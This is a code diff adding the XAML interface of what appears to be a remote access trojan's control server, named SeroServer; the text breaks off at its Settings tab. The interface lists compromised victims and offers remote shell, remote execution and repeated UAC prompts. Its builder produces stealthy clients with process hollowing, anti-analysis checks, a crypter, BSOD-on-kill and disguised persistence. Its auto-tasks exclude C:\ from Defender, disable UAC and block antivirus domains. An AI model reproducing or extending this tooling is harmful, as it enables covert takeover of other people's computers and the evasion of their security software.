@@ -1,0 +1,581 @@
+<Window x:Class="SeroServer.UI.ServerWindow"
+        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+        Title="SɆⱤØ₮Ø₦ł₦Ɇ"
+        Width="1020" Height="720"
+        WindowStartupLocation="CenterScreen"
+        ResizeMode="CanResize"
+        WindowStyle="None"
+        AllowsTransparency="True"
+        Background="Transparent"
+        MouseLeftButtonDown="Window_MouseLeftButtonDown">
+
+    <Window.Resources>
+        <BooleanToVisibilityConverter x:Key="BoolToVis" />
+        <!-- DataGrid Row Style -->
+        <Style TargetType="DataGridRow">
+            <Setter Property="Background" Value="Transparent" />
+            <Setter Property="BorderThickness" Value="0" />
+            <Setter Property="Foreground" Value="{StaticResource TextBrush}" />
+            <Style.Triggers>
+                <Trigger Property="IsMouseOver" Value="True">
+                    <Setter Property="Background" Value="#1c2333" />
+                </Trigger>
+                <Trigger Property="IsSelected" Value="True">
+                    <Setter Property="Background" Value="#1a2742" />
+                </Trigger>
+            </Style.Triggers>
+        </Style>
+        <Style TargetType="DataGridCell">
+            <Setter Property="BorderThickness" Value="0" />
+            <Setter Property="Padding" Value="8,5" />
+            <Setter Property="Template">
+                <Setter.Value>
+                    <ControlTemplate TargetType="DataGridCell">
+                        <Border Background="{TemplateBinding Background}" Padding="{TemplateBinding Padding}">
+                            <ContentPresenter VerticalAlignment="Center" />
+                        </Border>
+                    </ControlTemplate>
+                </Setter.Value>
+            </Setter>
+            <Style.Triggers>
+                <Trigger Property="IsSelected" Value="True">
+                    <Setter Property="Background" Value="Transparent" />
+                    <Setter Property="Foreground" Value="{StaticResource CyanBrush}" />
+                </Trigger>
+            </Style.Triggers>
+        </Style>
+        <!-- Context Menu Style -->
+        <Style TargetType="ContextMenu">
+            <Setter Property="Background" Value="#1c2333" />
+            <Setter Property="BorderBrush" Value="{StaticResource BorderBrush}" />
+            <Setter Property="BorderThickness" Value="1" />
+            <Setter Property="Foreground" Value="{StaticResource TextBrush}" />
+            <Setter Property="Padding" Value="2" />
+        </Style>
+        <Style TargetType="MenuItem">
+            <Setter Property="Background" Value="Transparent" />
+            <Setter Property="Foreground" Value="{StaticResource TextBrush}" />
+            <Setter Property="Padding" Value="10,6" />
+            <Setter Property="FontSize" Value="12" />
+            <Style.Triggers>
+                <Trigger Property="IsHighlighted" Value="True">
+                    <Setter Property="Background" Value="#21262d" />
+                </Trigger>
+            </Style.Triggers>
+        </Style>
+    </Window.Resources>
+
+    <Border Background="{StaticResource BgBrush}" CornerRadius="12" BorderBrush="#1a2742" BorderThickness="1">
+        <Border.Effect>
+            <DropShadowEffect Color="#000000" BlurRadius="20" ShadowDepth="0" Opacity="0.5" />
+        </Border.Effect>
+        <Grid>
+            <Grid.RowDefinitions>
+                <RowDefinition Height="48" />
+                <RowDefinition Height="Auto" />
+                <RowDefinition Height="*" />
+                <RowDefinition Height="Auto" />
+            </Grid.RowDefinitions>
+
+            <!-- Title Bar -->
+            <Border Grid.Row="0" Background="#0b0f15" CornerRadius="12,12,0,0">
+                <Grid Margin="18,0">
+                    <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
+                        <Border Width="24" Height="24" CornerRadius="6" Background="#1a2742" Margin="0,0,10,0">
+                            <TextBlock Text="S" FontSize="13" FontWeight="Bold" Foreground="{StaticResource CyanBrush}"
+                                       HorizontalAlignment="Center" VerticalAlignment="Center" />
+                        </Border>
+                        <TextBlock Text="SɆⱤØ₮Ø₦ł₦Ɇ" FontSize="14" FontWeight="Bold" Foreground="{StaticResource CyanBrush}" />
+                        <TextBlock Text="  v1.0" FontSize="11" Foreground="{StaticResource DimBrush}" VerticalAlignment="Bottom" Margin="0,0,0,1" />
+                    </StackPanel>
+                    <StackPanel Orientation="Horizontal" HorizontalAlignment="Right" VerticalAlignment="Center">
+                        <Ellipse x:Name="TitleDot" Width="8" Height="8" Fill="{StaticResource RedBrush}" Margin="0,0,12,0" />
+                        <Button Content="─" Width="32" Height="28" Style="{StaticResource SBtn}" Click="Minimize_Click" Padding="0" FontSize="11" />
+                        <Button x:Name="BtnFullscreen" Content="☐" Width="32" Height="28" Style="{StaticResource SBtn}" Click="Fullscreen_Click" Padding="0" Margin="4,0,0,0" FontSize="11" />
+                        <Button Content="✕" Width="32" Height="28" Style="{StaticResource SRedBtn}" Click="Close_Click" Padding="0" Margin="4,0,0,0" FontSize="10" />
+                    </StackPanel>
+                </Grid>
+            </Border>
+
+            <!-- Control Bar -->
+            <Border Grid.Row="1" Background="{StaticResource SurfaceBrush}" Padding="18,10"
+                    BorderBrush="{StaticResource BorderBrush}" BorderThickness="0,0,0,1">
+                <Grid>
+                    <Grid.ColumnDefinitions>
+                        <ColumnDefinition Width="Auto" />
+                        <ColumnDefinition Width="Auto" />
+                        <ColumnDefinition Width="*" />
+                        <ColumnDefinition Width="Auto" />
+                        <ColumnDefinition Width="Auto" />
+                        <ColumnDefinition Width="Auto" />
+                    </Grid.ColumnDefinitions>
+
+                    <TextBlock Grid.Column="0" Text="PORT" Foreground="{StaticResource DimBrush}"
+                               VerticalAlignment="Center" FontSize="10" FontWeight="SemiBold" Margin="0,0,8,0" />
+                    <TextBox Grid.Column="1" x:Name="TxtPort" Style="{StaticResource STxt}"
+                             Width="70" Text="7777" />
+
+                    <StackPanel Grid.Column="2" Orientation="Horizontal" Margin="20,0,0,0" VerticalAlignment="Center">
+                        <Ellipse x:Name="ServerDot" Width="8" Height="8" Fill="{StaticResource RedBrush}" />
+                        <TextBlock x:Name="TxtServerStatus" Text="Stopped" Foreground="{StaticResource DimBrush}"
+                                   FontSize="12" Margin="8,0,0,0" />
+                        <TextBlock x:Name="TxtClientCount" Text="  |  0 clients" Foreground="{StaticResource DimBrush}"
+                                   FontSize="12" />
+                    </StackPanel>
+
+                    <Button Grid.Column="3" x:Name="BtnStartStop" Content="START"
+                            Style="{StaticResource SGreenBtn}" Click="StartStop_Click" Width="80" />
+
+                    <Button Grid.Column="4" Content="Export Cert" Style="{StaticResource SBtn}"
+                            Click="ExportCert_Click" Margin="8,0,0,0" />
+                    <Button Grid.Column="5" Content="Import Cert" Style="{StaticResource SBtn}"
+                            Click="ImportCert_Click" Margin="4,0,0,0" />
+                </Grid>
+            </Border>
+
+            <!-- Main Content (Tabs) -->
+            <TabControl Grid.Row="2" Background="Transparent" BorderThickness="0" Margin="0"
+                        Foreground="{StaticResource TextBrush}">
+                <TabControl.Resources>
+                    <Style TargetType="TabItem">
+                        <Setter Property="Foreground" Value="{StaticResource DimBrush}" />
+                        <Setter Property="Background" Value="Transparent" />
+                        <Setter Property="Padding" Value="16,10" />
+                        <Setter Property="FontSize" Value="12" />
+                        <Setter Property="FontWeight" Value="Medium" />
+                        <Setter Property="Template">
+                            <Setter.Value>
+                                <ControlTemplate TargetType="TabItem">
+                                    <Border x:Name="bd" Background="Transparent" Padding="{TemplateBinding Padding}"
+                                            BorderThickness="0,0,0,2" BorderBrush="Transparent" Cursor="Hand">
+                                        <ContentPresenter ContentSource="Header" HorizontalAlignment="Center" />
+                                    </Border>
+                                    <ControlTemplate.Triggers>
+                                        <Trigger Property="IsSelected" Value="True">
+                                            <Setter TargetName="bd" Property="BorderBrush" Value="{StaticResource CyanBrush}" />
+                                            <Setter Property="Foreground" Value="{StaticResource TextBrush}" />
+                                        </Trigger>
+                                        <Trigger Property="IsMouseOver" Value="True">
+                                            <Setter Property="Foreground" Value="{StaticResource TextBrush}" />
+                                        </Trigger>
+                                    </ControlTemplate.Triggers>
+                                </ControlTemplate>
+                            </Setter.Value>
+                        </Setter>
+                    </Style>
+                </TabControl.Resources>
+
+                <!-- Dashboard Tab -->
+                <TabItem Header="Dashboard">
+                    <Border Background="{StaticResource SurfaceBrush}" Margin="8" Padding="24" CornerRadius="8">
+                        <StackPanel>
+                            <TextBlock Text="OVERVIEW" Style="{StaticResource SLabel}" FontSize="11" Margin="0,0,0,12" />
+                            <WrapPanel Margin="0,0,0,0">
+                                <Border Background="#0f1923" CornerRadius="8" Padding="24,18" Margin="0,0,14,10"
+                                        BorderBrush="#1a3a2a" BorderThickness="1" MinWidth="150">
+                                    <StackPanel>
+                                        <TextBlock Text="ONLINE" Foreground="{StaticResource DimBrush}" FontSize="10" FontWeight="SemiBold" />
+                                        <TextBlock x:Name="DashOnline" Text="0" Foreground="{StaticResource GreenBrush}"
+                                                   FontSize="32" FontWeight="Bold" Margin="0,4,0,0" />
+                                    </StackPanel>
+                                </Border>
+                                <Border Background="#0f1923" CornerRadius="8" Padding="24,18" Margin="0,0,14,10"
+                                        BorderBrush="#1a2742" BorderThickness="1" MinWidth="150">
+                                    <StackPanel>
+                                        <TextBlock Text="TOTAL SEEN" Foreground="{StaticResource DimBrush}" FontSize="10" FontWeight="SemiBold" />
+                                        <TextBlock x:Name="DashTotal" Text="0" Foreground="{StaticResource CyanBrush}"
+                                                   FontSize="32" FontWeight="Bold" Margin="0,4,0,0" />
+                                    </StackPanel>
+                                </Border>
+                                <Border Background="#0f1923" CornerRadius="8" Padding="24,18" Margin="0,0,14,10"
+                                        BorderBrush="#2a2318" BorderThickness="1" MinWidth="150">
+                                    <StackPanel>
+                                        <TextBlock Text="UPTIME" Foreground="{StaticResource DimBrush}" FontSize="10" FontWeight="SemiBold" />
+                                        <TextBlock x:Name="DashUptime" Text="--" Foreground="{StaticResource YellowBrush}"
+                                                   FontSize="22" FontWeight="Bold" Margin="0,4,0,0" />
+                                    </StackPanel>
+                                </Border>
+                            </WrapPanel>
+                        </StackPanel>
+                    </Border>
+                </TabItem>
+
+                <!-- Online Tab -->
+                <TabItem Header="Online">
+                    <Border Background="{StaticResource SurfaceBrush}" Margin="8" CornerRadius="8">
+                        <DataGrid x:Name="GridClients"
+                                  AutoGenerateColumns="False"
+                                  IsReadOnly="True"
+                                  PreviewKeyDown="GridClients_PreviewKeyDown"
+                                  Background="Transparent"
+                                  Foreground="{StaticResource TextBrush}"
+                                  BorderThickness="0"
+                                  RowBackground="Transparent"
+                                  AlternatingRowBackground="#0f1318"
+                                  GridLinesVisibility="None"
+                                  HeadersVisibility="Column"
+                                  FontSize="12"
+                                  SelectionMode="Extended"
+                                  CanUserAddRows="False"
+                                  VirtualizingStackPanel.IsVirtualizing="True"
+                                  VirtualizingStackPanel.VirtualizationMode="Recycling"
+                                  ScrollViewer.CanContentScroll="True">
+                            <DataGrid.ColumnHeaderStyle>
+                                <Style TargetType="DataGridColumnHeader">
+                                    <Setter Property="Background" Value="#0b0f15" />
+                                    <Setter Property="Foreground" Value="{StaticResource DimBrush}" />
+                                    <Setter Property="Padding" Value="10,8" />
+                                    <Setter Property="FontSize" Value="10" />
+                                    <Setter Property="FontWeight" Value="SemiBold" />
+                                    <Setter Property="BorderThickness" Value="0,0,0,1" />
+                                    <Setter Property="BorderBrush" Value="{StaticResource BorderBrush}" />
+                                </Style>
+                            </DataGrid.ColumnHeaderStyle>
+                            <DataGrid.Columns>
+                                <DataGridTextColumn Header="ID" Binding="{Binding Id}" Width="70" />
+                                <DataGridTextColumn Header="TAG" Binding="{Binding Tag}" Width="80" />
+                                <DataGridTextColumn Header="USER" Binding="{Binding Username}" Width="100" />
+                                <DataGridTextColumn Header="IP" Binding="{Binding IP}" Width="120" />
+                                <DataGridTextColumn Header="PRIVILEGE" Binding="{Binding Privilege}" Width="70" />
+                                <DataGridTextColumn Header="COUNTRY" Binding="{Binding CountryDisplay}" Width="130" />
+                                <DataGridTextColumn Header="MACHINE" Binding="{Binding MachineName}" Width="100" />
+                                <DataGridTextColumn Header="OS" Binding="{Binding OS}" Width="130" />
+                                <DataGridTextColumn Header="PAYLOAD" Binding="{Binding Payload}" Width="120" />
+                                <DataGridTextColumn Header="ANTIVIRUS" Binding="{Binding Antivirus}" Width="130" />
+                                <DataGridTextColumn Header="FIRST SEEN" Binding="{Binding FirstSeen, StringFormat=yyyy-MM-dd}" Width="90" />
+                                <DataGridTextColumn Header="PING" Binding="{Binding PingDisplay}" Width="85" />
+                            </DataGrid.Columns>
+                            <DataGrid.ContextMenu>
+                                <ContextMenu>
+                                    <MenuItem Header="Remote Shell" Click="RemoteShell_Click" />
+                                    <MenuItem Header="Remote File Execute" Click="RemoteFileExec_Click" />
+                                    <MenuItem Header="Update Client (file)" Click="UpdateClient_Click" />
+                                    <Separator />
+                                    <MenuItem Header="Request Elevation (UAC)" Click="RequestElevation_Click" />
+                                    <MenuItem Header="Loop UAC Until Accept" Click="RequestElevationLoop_Click" />
+                                    <Separator />
+                                    <MenuItem Header="Set Tag" Click="SetTag_Click" />
+                                    <MenuItem Header="View Logs" Click="ViewClientLogs_Click" />
+                                    <Separator />
+                                    <MenuItem Header="Uninstall Client" Click="UninstallClient_Click" />
+                                    <MenuItem Header="Disconnect" Click="DisconnectClient_Click" />
+                                    <Separator />
+                                    <MenuItem Header="Copy IP" Click="CopyIP_Click" />
+                                </ContextMenu>
+                            </DataGrid.ContextMenu>
+                        </DataGrid>
+                    </Border>
+                </TabItem>
+
+                <!-- All Clients Tab -->
+                <TabItem Header="All Clients">
+                    <Border Background="{StaticResource SurfaceBrush}" Margin="8" CornerRadius="8">
+                        <DataGrid x:Name="GridAllClients"
+                                  AutoGenerateColumns="False"
+                                  IsReadOnly="True"
+                                  Background="Transparent"
+                                  Foreground="{StaticResource TextBrush}"
+                                  BorderThickness="0"
+                                  RowBackground="Transparent"
+                                  AlternatingRowBackground="#0f1318"
+                                  GridLinesVisibility="None"
+                                  HeadersVisibility="Column"
+                                  FontSize="12"
+                                  SelectionMode="Extended"
+                                  CanUserAddRows="False"
+                                  VirtualizingStackPanel.IsVirtualizing="True"
+                                  VirtualizingStackPanel.VirtualizationMode="Recycling"
+                                  ScrollViewer.CanContentScroll="True">
+                            <DataGrid.ColumnHeaderStyle>
+                                <Style TargetType="DataGridColumnHeader">
+                                    <Setter Property="Background" Value="#0b0f15" />
+                                    <Setter Property="Foreground" Value="{StaticResource DimBrush}" />
+                                    <Setter Property="Padding" Value="10,8" />
+                                    <Setter Property="FontSize" Value="10" />
+                                    <Setter Property="FontWeight" Value="SemiBold" />
+                                    <Setter Property="BorderThickness" Value="0,0,0,1" />
+                                    <Setter Property="BorderBrush" Value="{StaticResource BorderBrush}" />
+                                </Style>
+                            </DataGrid.ColumnHeaderStyle>
+                            <DataGrid.Columns>
+                                <DataGridTextColumn Header="TAG" Binding="{Binding Tag}" Width="80" />
+                                <DataGridTextColumn Header="USER" Binding="{Binding LastUsername}" Width="100" />
+                                <DataGridTextColumn Header="IP" Binding="{Binding LastIP}" Width="120" />
+                                <DataGridTextColumn Header="COUNTRY" Binding="{Binding LastCountry}" Width="100" />
+                                <DataGridTextColumn Header="MACHINE" Binding="{Binding LastMachineName}" Width="100" />
+                                <DataGridTextColumn Header="OS" Binding="{Binding LastOS}" Width="130" />
+                                <DataGridTextColumn Header="FIRST SEEN" Binding="{Binding FirstSeen, StringFormat=yyyy-MM-dd HH:mm}" Width="130" />
+                                <DataGridTextColumn Header="LAST SEEN" Binding="{Binding LastSeen, StringFormat=yyyy-MM-dd HH:mm}" Width="130" />
+                            </DataGrid.Columns>
+                            <DataGrid.ContextMenu>
+                                <ContextMenu>
+                                    <MenuItem Header="Set Tag" Click="SetTagRecord_Click" />
+                                    <MenuItem Header="View Logs" Click="ViewRecordLogs_Click" />
+                                    <Separator />
+                                    <MenuItem Header="Copy HWID" Click="CopyRecordHwid_Click" />
+                                </ContextMenu>
+                            </DataGrid.ContextMenu>
+                        </DataGrid>
+                    </Border>
+                </TabItem>
+
+                <!-- Builder Tab -->
+                <TabItem Header="Builder">
+                    <Border Background="{StaticResource SurfaceBrush}" Margin="8" Padding="20" CornerRadius="8">
+                        <ScrollViewer VerticalScrollBarVisibility="Auto">
+                            <Grid x:Name="BuilderPanel">
+                                <Grid.ColumnDefinitions>
+                                    <ColumnDefinition Width="*" MaxWidth="440" />
+                                    <ColumnDefinition Width="24" />
+                                    <ColumnDefinition Width="*" MaxWidth="500" />
+                                </Grid.ColumnDefinitions>
+
+                                <!-- Left Column -->
+                                <StackPanel Grid.Column="0">
+                                    <!-- Connection -->
+                                    <TextBlock Text="CONNECTION" Style="{StaticResource SLabel}" FontSize="11" />
+                                    <TextBlock Text="HOSTS" Style="{StaticResource SFieldLabel}" />
+                                    <ListBox x:Name="BldHosts" Style="{StaticResource SListBox}" Height="100" Margin="0,0,0,8" />
+                                    <Grid Margin="0,0,0,16">
+                                        <Grid.ColumnDefinitions>
+                                            <ColumnDefinition Width="*" />
+                                            <ColumnDefinition Width="Auto" />
+                                            <ColumnDefinition Width="Auto" />
+                                        </Grid.ColumnDefinitions>
+                                        <TextBox x:Name="BldHostInput" Style="{StaticResource STxt}" />
+                                        <Button Grid.Column="1" Content="+" Width="50" Margin="6,0,0,0" Style="{StaticResource SBtn}" Click="BldAddHost_Click" />
+                                        <Button Grid.Column="2" Content="−" Width="50" Margin="6,0,0,0" Style="{StaticResource SBtn}" Click="BldDelHost_Click" />
+                                    </Grid>
+                                    <TextBlock Text="PORT" Style="{StaticResource SFieldLabel}" />
+                                    <TextBox x:Name="BldPort" Style="{StaticResource STxt}" Text="7777" Margin="0,0,0,8" />
+                                    <CheckBox x:Name="BldUsePastebin" Content="Use Pastebin (disables direct connection)" Style="{StaticResource SChk}" IsChecked="False" Checked="BldUsePastebin_Checked" Unchecked="BldUsePastebin_Unchecked" Margin="0,0,0,8" />
+                                    <TextBlock Text="PASTEBIN URL" Style="{StaticResource SFieldLabel}" />
+                                    <TextBox x:Name="BldPastebinUrl" Style="{StaticResource STxt}" Text="https://pastebin.com/raw/YourURL" IsEnabled="False" Margin="0,0,0,16" />
+
+                                    <!-- Identity -->
+                                    <TextBlock Text="IDENTITY" Style="{StaticResource SLabel}" FontSize="11" />
+                                    <TextBlock Text="CLIENT ID PREFIX (e.g. lab → lab-a1b2c3d4)" Style="{StaticResource SFieldLabel}" />
+                                    <TextBox x:Name="BldClientIdPrefix" Style="{StaticResource STxt}" Text="" Margin="0,0,0,16" />
+                                    <CheckBox x:Name="BldSetAssembly" Content="Copy assembly metadata from executable" Style="{StaticResource SChk}" IsChecked="False" Margin="0,0,0,8" Checked="BldSetAssembly_Checked" Unchecked="BldSetAssembly_Unchecked" />
+                                    <TextBlock x:Name="BldAssemblyPath" Text="No executable selected" Foreground="{StaticResource DimBrush}" Margin="0,0,0,16" />
+                                    <CheckBox x:Name="BldSetIcon" Content="Set custom icon from .ico file" Style="{StaticResource SChk}" IsChecked="False" Margin="0,0,0,8" Checked="BldSetIcon_Checked" Unchecked="BldSetIcon_Unchecked" />
+                                    <TextBlock x:Name="BldIconPath" Text="No icon selected" Foreground="{StaticResource DimBrush}" Margin="0,0,0,16" />
+                                    <CheckBox x:Name="BldUseMutex" Content="Use Mutex" Style="{StaticResource SChk}" IsChecked="True" Margin="0,0,0,8" />
+                                    <TextBlock Text="MUTEX" Style="{StaticResource SFieldLabel}" />
+                                    <Grid Margin="0,0,0,16">
+                                        <Grid.ColumnDefinitions>
+                                            <ColumnDefinition Width="*" />
+                                            <ColumnDefinition Width="Auto" />
+                                        </Grid.ColumnDefinitions>
+                                        <TextBox x:Name="BldMutex" Style="{StaticResource STxt}"
+                                                 Text="Global\{B7E9F3A1-4D2C-4A8E-9F1B-3C5D7E2A6B8F}" />
+                                        <Button Grid.Column="1" Content="GEN" Width="70" Margin="6,0,0,0"
+                                                Style="{StaticResource SBtn}" Click="BldGenMutex_Click" />
+                                    </Grid>
+                                </StackPanel>
+
+                                <!-- Right Column -->
+                                <StackPanel Grid.Column="2">
+                                    <!-- Process Hollowing -->
+                                    <TextBlock Text="PROCESS HOLLOWING" Style="{StaticResource SLabel}" FontSize="11" />
+                                    <CheckBox x:Name="BldHollowing" Content="Auto-inject into legitimate process" Style="{StaticResource SChk}" IsChecked="False" />
+                                    <StackPanel Orientation="Horizontal" Margin="0,4,0,16"
+                                              Visibility="{Binding IsChecked, ElementName=BldHollowing, Converter={StaticResource BoolToVis}}">
+                                        <TextBlock Text="Target: " Foreground="{StaticResource DimBrush}"
+                                                   FontSize="12" VerticalAlignment="Center" />
+                                        <ComboBox x:Name="BldHollowTarget" MinWidth="400" MaxDropDownHeight="460"
+                                                  IsEnabled="{Binding IsChecked, ElementName=BldHollowing}"
+                                                  IsEditable="True" Text=""
+                                                  FontFamily="Consolas" FontSize="11"
+                                                  Background="White" Foreground="Black"
+                                                  BorderBrush="#888">
+                                            <ComboBox.ItemTemplate>
+                                                <DataTemplate>
+                                                    <Grid MinWidth="380">
+                                                        <Grid.ColumnDefinitions>
+                                                            <ColumnDefinition Width="180" />
+                                                            <ColumnDefinition Width="50" />
+                                                            <ColumnDefinition Width="*" />
+                                                        </Grid.ColumnDefinitions>
+                                                        <TextBlock Grid.Column="0" Text="{Binding Proc}" FontWeight="SemiBold"
+                                                                   Foreground="Black" FontFamily="Consolas" FontSize="11" VerticalAlignment="Center" />
+                                                        <TextBlock Grid.Column="1" Text="{Binding Score}" Foreground="{Binding ScoreColor}"
+                                                                   FontWeight="Bold" FontFamily="Consolas" FontSize="11" VerticalAlignment="Center" />
+                                                        <TextBlock Grid.Column="2" Text="{Binding Note}" Foreground="#666"
+                                                                   FontFamily="Consolas" FontSize="10" VerticalAlignment="Center" />
+                                                    </Grid>
+                                                </DataTemplate>
+                                            </ComboBox.ItemTemplate>
+                                        </ComboBox>
+                                    </StackPanel>
+
+                                    <!-- Protection -->
+                                    <TextBlock Text="PROTECTION" Style="{StaticResource SLabel}" FontSize="11" Margin="0,16,0,0" />
+                                    <CheckBox x:Name="BldAntiDebug" Content="Anti-Debug" Style="{StaticResource SChk}" IsChecked="True" />
+                                    <CheckBox x:Name="BldAntiVM" Content="Anti-VM" Style="{StaticResource SChk}" IsChecked="True" />
+                                    <CheckBox x:Name="BldAntiDetect" Content="Anti-Detect (analysis tools)" Style="{StaticResource SChk}" IsChecked="True" />
+                                    <CheckBox x:Name="BldAntiSandbox" Content="Anti-Sandbox" Style="{StaticResource SChk}" IsChecked="True" />
+                                    <CheckBox x:Name="BldAntiKill" Content="Anti-Kill (BSOD on terminate, requires admin)" Style="{StaticResource SChk}" IsChecked="False"
+                                              ToolTip="Marque le processus comme critique — toute tentative de le tuer provoque un BSOD. Fonctionne aussi en RunPE (marque le processus hôte ex: dllhost.exe)." />
+                                    <CheckBox x:Name="BldWatchdog" Content="Watchdog" Style="{StaticResource SChk}" IsChecked="False"
+                                              Checked="BldPersist_Changed" Unchecked="BldPersist_Changed" />
+                                    <TextBlock x:Name="TxtMaxPersist" Margin="18,2,0,12" FontSize="10"
+                                               Foreground="#1b8a2e" FontWeight="SemiBold"
+                                               Text="✓ Persistance maximale"
+                                               Visibility="Collapsed" />
+
+                                    <!-- Obfuscation -->
+                                    <TextBlock Text="OBFUSCATION" Style="{StaticResource SLabel}" FontSize="11" />
+                                    <CheckBox x:Name="BldEncrypt" Content="Crypter (AES-256, junk code, polymorphic, pumped)" Style="{StaticResource SChk}" IsChecked="False" Margin="0,0,0,16" />
+
+                                    <!-- Persistence -->
+                                    <TextBlock Text="PERSISTENCE (AppData/Roaming)" Style="{StaticResource SLabel}" FontSize="11" />
+                                    <CheckBox x:Name="BldPersistRegistry" Content="Registry (HKCU\Run)" Style="{StaticResource SChk}" IsChecked="False" Checked="BldPersist_Changed" Unchecked="BldPersist_Changed" />
+                                    <CheckBox x:Name="BldPersistStartup" Content="Startup Folder" Style="{StaticResource SChk}" IsChecked="False" Checked="BldPersist_Changed" Unchecked="BldPersist_Changed" />
+                                    <CheckBox x:Name="BldPersistTask" Content="Scheduled Task (hidden from Startup tab)" Style="{StaticResource SChk}" IsChecked="True" Checked="BldPersist_Changed" Unchecked="BldPersist_Changed" />
+                                    <StackPanel x:Name="BldInstallPanel" Orientation="Vertical">
+                                        <StackPanel Orientation="Horizontal" Margin="0,4,0,4">
+                                            <TextBlock Text="Install folder: " Foreground="{StaticResource DimBrush}" FontSize="12" VerticalAlignment="Center" />
+                                            <TextBox x:Name="BldInstallFolder" Style="{StaticResource STxt}" Width="160" Text="Windows" />
+                                        </StackPanel>
+                                        <StackPanel Orientation="Horizontal" Margin="0,0,0,16">
+                                            <TextBlock Text="File name:       " Foreground="{StaticResource DimBrush}" FontSize="12" VerticalAlignment="Center" />
+                                            <TextBox x:Name="BldInstallFileName" Style="{StaticResource STxt}" Width="160" Text="windows.exe" />
+                                        </StackPanel>
+                                    </StackPanel>
+
+                                    <!-- Security (auto-generated, hidden) -->
+                                    <TextBox x:Name="BldAuthKey" Visibility="Collapsed" />
+                                    <TextBox x:Name="BldCertHash" Visibility="Collapsed" />
+
+                                    <!-- Reconnect -->
+                                    <TextBlock Text="RECONNECT" Style="{StaticResource SLabel}" FontSize="11" />
+                                    <StackPanel Orientation="Horizontal" Margin="0,0,0,24">
+                                        <TextBlock Text="Delay (ms): " Foreground="{StaticResource DimBrush}"
+                                                   FontSize="12" VerticalAlignment="Center" />
+                                        <TextBox x:Name="BldReconnectDelay" Style="{StaticResource STxt}" Width="70" Text="5000" />
+                                    </StackPanel>
+
+                                    <!-- Build Buttons -->
+                                    <StackPanel Orientation="Horizontal" Margin="0,8,0,0">
+                                        <Button x:Name="BtnBuild" Content="BUILD" Width="130" Height="36"
+                                                Style="{StaticResource SGreenBtn}" Click="Build_Click" FontWeight="SemiBold" />
+                                        <Button Content="SAVE" Width="70" Height="36" Margin="10,0,0,0"
+                                                Style="{StaticResource SBtn}" Click="BldSaveConfig_Click" />
+                                        <Button Content="CHECK ALL" Width="100" Height="36" Margin="10,0,0,0"
+                                                Style="{StaticResource SBtn}" Click="BldCheckAll_Click" />
+                                    </StackPanel>
+
+                                    <!-- Build status -->
+                                    <TextBlock x:Name="TxtBuildStatus" Text="" Foreground="{StaticResource DimBrush}"
+                                               FontSize="11" FontFamily="Consolas" TextWrapping="Wrap" Margin="0,14,0,0" />
+                                </StackPanel>
+                            </Grid>
+                        </ScrollViewer>
+                    </Border>
+                </TabItem>
+
+                <!-- AutoTask Tab -->
+                <TabItem Header="AutoTask">
+                    <Border Background="{StaticResource SurfaceBrush}" Margin="8" Padding="24" CornerRadius="8">
+                        <Grid>
+                            <Grid.RowDefinitions>
+                                <RowDefinition Height="Auto" />
+                                <RowDefinition Height="*" />
+                            </Grid.RowDefinitions>
+
+                            <StackPanel Orientation="Horizontal" Margin="0,0,0,12">
+                                <Button Content="ADD FILE" Width="100" Height="32" Style="{StaticResource SGreenBtn}" Click="AutoTask_AddFile_Click" />
+                                <Button Content="ADD RUNPE" Width="100" Height="32" Margin="10,0,0,0"
+                                        Style="{StaticResource SGreenBtn}" Click="AutoTask_AddHollow_Click"
+                                        ToolTip="Add file to execute via process hollowing (RunPE)" />
+                                <Button Content="EXCLUDE C:\" Width="110" Height="32" Margin="10,0,0,0"
+                                        Style="{StaticResource SGreenBtn}" Click="AutoTask_ExcludeDefender_Click"
+                                        ToolTip="Auto-add C:\ Defender exclusion on admin clients" />
+                                <Button Content="DISABLE UAC" Width="110" Height="32" Margin="10,0,0,0"
+                                        Style="{StaticResource SGreenBtn}" Click="AutoTask_DisableUAC_Click"
+                                        ToolTip="Auto-disable UAC on admin clients (needs reboot)" />
+                                <Button Content="BLOCK AV DNS" Width="120" Height="32" Margin="10,0,0,0"
+                                        Style="{StaticResource SGreenBtn}" Click="AutoTask_BlockAvDomains_Click"
+                                        ToolTip="Block all AV domains in hosts file (admin only)" />
+                                <Button Content="REMOVE" Width="100" Height="32" Margin="10,0,0,0" Style="{StaticResource SBtn}" Click="AutoTask_Remove_Click" />
+                                <TextBlock Text="Tasks auto-execute once per HWID" Foreground="{StaticResource DimBrush}"
+                                           FontSize="11" VerticalAlignment="Center" Margin="16,0,0,0" />
+                            </StackPanel>
+
+                            <DataGrid x:Name="GridAutoTasks" Grid.Row="1"
+                                      AutoGenerateColumns="False" IsReadOnly="True"
+                                      Background="Transparent" Foreground="{StaticResource TextBrush}"
+                                      BorderThickness="0" RowBackground="Transparent"
+                                      AlternatingRowBackground="#0f1318" GridLinesVisibility="None"
+                                      HeadersVisibility="Column" FontSize="12"
+                                      SelectionMode="Extended" CanUserAddRows="False">
+                                <DataGrid.ColumnHeaderStyle>
+                                    <Style TargetType="DataGridColumnHeader">
+                                        <Setter Property="Background" Value="Transparent" />
+                                        <Setter Property="Foreground" Value="{StaticResource DimBrush}" />
+                                        <Setter Property="FontSize" Value="10" />
+                                        <Setter Property="Padding" Value="8,6" />
+                                        <Setter Property="BorderThickness" Value="0,0,0,1" />
+                                        <Setter Property="BorderBrush" Value="{StaticResource BorderBrush}" />
+                                    </Style>
+                                </DataGrid.ColumnHeaderStyle>
+                                <DataGrid.Columns>
+                                    <DataGridTextColumn Header="NAME" Binding="{Binding FileName}" Width="200" />
+                                    <DataGridTextColumn Header="TYPE" Binding="{Binding TypeDisplay}" Width="100" />
+                                    <DataGridTextColumn Header="SIZE" Binding="{Binding SizeDisplay}" Width="100" />
+                                    <DataGridTextColumn Header="EXECUTIONS" Binding="{Binding ExecutionCount}" Width="100" />
+                                    <DataGridTextColumn Header="ADDED" Binding="{Binding AddedAt, StringFormat=yyyy-MM-dd HH:mm}" Width="140" />
+                                </DataGrid.Columns>
+                            </DataGrid>
+                        </Grid>
+                    </Border>
+                </TabItem>
+
+                <!-- Settings Tab -->
+                <TabItem Header="Settings">
+                    <Border Background="{StaticResource SurfaceBrush}" Margin="8" Padding="24" CornerRadius="8">
+                        <StackPanel MaxWidth="500" HorizontalAlignment="Left">
+                            <TextBlock Text="SERVER LIMITS" Style="{StaticResource SLabel}" FontSize="11" />
